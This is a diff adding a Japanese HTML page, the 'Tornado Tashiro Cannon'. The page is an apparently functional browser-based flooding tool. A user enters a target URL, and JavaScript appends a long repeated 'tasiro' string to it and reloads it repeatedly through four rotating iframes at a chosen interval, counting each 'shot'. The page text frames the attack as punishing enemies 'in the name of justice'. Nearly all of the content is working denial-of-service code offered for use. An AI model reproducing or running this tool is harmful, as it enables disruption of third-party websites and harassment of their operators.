@@ -1,0 +1,110 @@
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <meta http-equiv="user-agent" content="Tasiro/4.0 (Compatible; TSTE 2.1; TasiroCameras TE 2007;)">
+        <title>トルネード田代砲</title>
+        <script>
+        resizeTo(640,520);
+        
+        var go = 0;
+        var kami = "";
+        var bomburl = "";
+        var inttime = 0;
+        var count = 0
+        var hyouziurl = "";
+        
+        function main() {
+            for(i = 0; i <= 320; i++) {
+                kami += "tasiro";
+            }
+        }
+        
+        function gobomb() {
+            hyouziurl = f.url.value;
+            count = 0;
+            inttime = f.intv.value;
+            bomburl = f.url.value;
+            bomburl += kami;
+            go = 1;
+            if (go == 1) {
+                setTimeout("bombone()", inttime);
+            }
+        }
+        
+        function bombone() {
+            if (go == 1) {
+                flameone.location.href = bomburl;
+                counting();
+                setTimeout("bombtwo()", inttime);
+            }
+        }
+        
+        function bombtwo() {
+            if (go == 1) {
+                flametwo.location.href = bomburl;
+                counting();
+                setTimeout("bombthr()", inttime);
+            }
+        }
+        
+        function bombthr() {
+            if (go == 1) {
+                flamethr.location.href = bomburl;
+                counting();
+                setTimeout("bombfour()", inttime);
+            }
+        }
+        
+        function bombfour() {
+            if (go == 1) {
+                flamefour.location.href = bomburl;
+                counting();
+                setTimeout("bombone()", inttime);
+            }
+        }
+        
+        function stopbomb() {
+            go = 0;
+            document.all.infff.innerText += "\n～砲撃を中止しました～"
+        }
+        
+        function onewindow() {
+            hyouziurl = f.url.value;
+            window.open(hyouziurl, "sample");
+        }
+        
+        function counting() {
+            count++;
+            document.all.infff.innerText = "～砲撃を実行しています～\n砲撃対象：" + hyouziurl + "\n回数：" + count + "回\n速度：" + (inttime*3) + "ms";
+        }
+        </script>
+    </head>
+    <body onload="main();">
+        <h1>ネ申【トルネード田代砲】風</h1>
+        <a>今こそ正義の名の下に、奴らを裁く時が来た。</a><br>
+        <a>総員、突撃！</a><br><br>
+        <form name="f">
+            <a>砲撃対象</a><br>
+            <input size="100" type="text" name="url" value="http://"><br>
+            <input type="button" value="戦況確認" onclick="onewindow();"><br><br>
+            <a>更新間隔（1/1000秒　2秒ごとの場合 2000に）</a><br>
+            <input type="text" size="10" name="intv" value="1000"><br><br>
+            <input type="button" value="砲撃開始" onclick="gobomb();"><input type="button" value="砲撃中止" onclick="stopbomb();"> <br><br><a>情報</a>
+        </form>
+        <div id="infff" style="border:1px solid #000000;height:119px;width:55%;">
+            <a>※ここに情報が表示されます。</a>
+        </div><br>
+        <iframe id="flameone" name="flameone" data-ruffle-polyfilled="" width="25%" height="13.18%"></iframe>
+        <iframe id="flametwo" name="flametwo" data-ruffle-polyfilled="" width="25%" height="13.18%"></iframe><br>
+        <iframe id="flamethr" name="flamethr" data-ruffle-polyfilled="" width="25%" height="13.18%"></iframe>
+        <iframe id="flamefour" name="flamefour" data-ruffle-polyfilled="" width="25%" height="13.18%"></iframe><br>
+    <script type="text/javascript"><!--
+var fc2footerparam = 'charset=' + encodeURIComponent(document.charset ? document.charset : document.characterSet) + '&url=' + encodeURIComponent(document.location) + '&service=0&r=' + Math.floor(Math.random()*99999999999);
+var fc2footertag = '<' + 'script src="//vip.chps-api.fc2.com/apis/footer/?' + fc2footerparam + '" charset="UTF-8"><' + '/script>';
+document.write(fc2footertag);
+//--></script>
+<!-- FC2, inc.-->
+<img src="//media.fc2.com/counter_img.php?id=50" style="visibility:hidden" alt="inserted by FC2 system" width="0" height="0">
+<!-- FC2, inc.-->
+</body>
+</html>
